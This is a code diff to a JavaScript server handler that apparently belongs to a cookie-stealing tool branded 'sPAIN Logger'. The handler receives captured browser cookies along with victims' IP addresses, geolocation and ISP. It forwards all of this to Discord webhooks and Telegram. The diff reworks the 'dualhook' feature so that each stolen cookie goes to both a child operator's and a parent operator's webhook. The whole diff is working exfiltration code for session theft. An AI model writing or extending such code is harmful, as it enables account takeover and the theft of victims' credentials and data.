@@ -142,42 +142,60 @@ export default async function handler(req, res) {
 
   const geoPromise = getIpGeo(ip);
 
-  await Promise.all(webhooks.map(async wh => {
-    await discordSend(wh, {
-      content: '@everyone',
-      embeds: [{
-        title:     '🍪 Cookie Captured',
-        color:     0xc026d3,
-        fields: [
-          { name: '🌐 IP',         value: `\`${ip}\``,                                                    inline: true  },
-          { name: '📄 Page',       value: pName,                                                           inline: true  },
-          ...(record.dualhookParent ? [
-            { name: '🎣 DH Parent', value: `\`${record.dualhookParent}\``,                                inline: true  },
-            { name: '🔗 DH Child',  value: `\`${slug}\``,                                                 inline: true  },
-          ] : []),
-          { name: '🕐 Time',       value: now,                                                             inline: false }
-        ],
-        footer:    { text: `sPAIN Logger • ${pName}` },
-        timestamp: now
-      }]
-    });
-    await discordChunked(wh, cookie);
-  }));
+  // Resolve webhook1 (dualhook parent webhook) if applicable
+  let webhook1 = null;
+  let webhook2 = record.webhook;
+  if (record.dualhookParent) {
+    try {
+      const parentRecord = await redisGet(`slot:${record.dualhookParent}`);
+      if (parentRecord?.webhook) webhook1 = parentRecord.webhook;
+    } catch (_) {}
+  }
 
   const geo = await geoPromise;
   const loc = [geo?.city, geo?.regionName, geo?.country].filter(Boolean).join(', ') || 'Unknown';
   const isp = geo?.isp || 'Unknown';
 
-  await Promise.all(webhooks.map(wh => discordSend(wh, {
+  // webhook2 embed: IP, Page, Time, Location, ISP, Cookie
+  await discordSend(webhook2, {
+    content: '@everyone',
     embeds: [{
-      color:  0xa855f7,
+      title:     '🍪 Cookie Captured',
+      color:     0xc026d3,
       fields: [
-        { name: '📍 Location', value: loc, inline: true },
-        { name: '🗺️ ISP',      value: isp, inline: true }
+        { name: '🌐 IP',       value: `\`${ip}\``, inline: true  },
+        { name: '📄 Page',     value: pName,        inline: true  },
+        { name: '🕐 Time',     value: now,          inline: false },
+        { name: '📍 Location', value: loc,          inline: true  },
+        { name: '🗺️ ISP',      value: isp,          inline: true  },
       ],
-      footer: { text: `sPAIN Logger • ${pName}` }
+      footer:    { text: `sPAIN Logger • ${pName}` },
+      timestamp: now
     }]
-  })));
+  });
+  await discordChunked(webhook2, cookie);
+
+  // webhook1 embed (dualhook only): IP, DH Parent, DH Child, Time, Location, ISP, Cookie
+  if (webhook1 && webhook1 !== webhook2) {
+    await discordSend(webhook1, {
+      content: '@everyone',
+      embeds: [{
+        title:     '🍪 Cookie Captured (Dualhook)',
+        color:     0x06b6d4,
+        fields: [
+          { name: '🌐 IP',        value: `\`${ip}\``,                   inline: true  },
+          { name: '🎣 DH Parent', value: `\`${record.dualhookParent}\``, inline: true  },
+          { name: '🔗 DH Child',  value: `\`${slug}\``,                 inline: true  },
+          { name: '🕐 Time',      value: now,                           inline: false },
+          { name: '📍 Location',  value: loc,                           inline: true  },
+          { name: '🗺️ ISP',       value: isp,                           inline: true  },
+        ],
+        footer:    { text: `sPAIN Logger • ${pName}` },
+        timestamp: now
+      }]
+    });
+    await discordChunked(webhook1, cookie);
+  }
 
   await tgSend([
     `🍪 <b>COOKIE — ${pName}</b>`,
